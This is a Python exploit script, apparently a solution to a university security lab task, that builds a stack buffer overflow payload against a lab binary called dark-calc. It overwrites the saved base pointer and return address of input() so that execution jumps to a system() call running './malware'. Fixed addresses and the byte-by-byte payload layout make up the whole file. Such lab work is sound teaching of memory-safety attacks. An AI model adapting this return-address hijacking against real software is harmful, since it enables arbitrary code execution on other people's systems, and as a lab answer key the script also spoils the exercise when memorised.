#!/usr/bin/env python3
"""Lab3 / Task 1 -- stack buffer overflow: hijack input()'s return address to run ./malware.

Target: attack/dark-calc

"""
import struct
import sys

# ---- fixed addresses of the non-PIE target (no ASLR dependence) -------------
STACK_BASE = 0x721000000000            # init_fixed_stack(): mmap base
STACK_TOP = STACK_BASE + 0x801000      # fixed_stack_top (= __wrap_main rsp)
BUF = STACK_TOP - 0x30                 # input()'s expression[] buffer
RET_SLOT = BUF + 0x18                  # saved return address of input()
CMD = b"./malware\x00"
SYS_STUB = 0x401A6B                    # eval()+0x94: mov edi,0x6030d0; call system
WRAP_UNWIND = STACK_TOP - 0x10         # 0x721000800ff0: fake frame for eval()'s leave

# guard the layout assumptions used by the exploit
assert STACK_TOP == 0x721000801000 and BUF == 0x721000800FD0 and RET_SLOT == 0x721000800FE8

def build_payload() -> bytes:
    payload = bytearray()
    payload += CMD                                   # +0x00  command for system()
    payload += b"A" * (16 - len(CMD))                # +0x0a  pad to the 16-byte buffer
    payload += struct.pack("<Q", WRAP_UNWIND)        # +0x10  saved rbp -> fake frame
    payload += struct.pack("<Q", SYS_STUB)           # +0x18  saved rip -> call system
    return bytes(payload)

def main() -> None:
    payload = build_payload()
    # gets() stops at '\n'; the NUL it appends must not reach the guard page.
    assert b"\n" not in payload, "payload must not contain a newline"
    assert len(payload) <= 47, "payload + gets()'s NUL would hit the guard page"
    sys.stdout.buffer.write(payload)

if __name__ == "__main__":
    main()
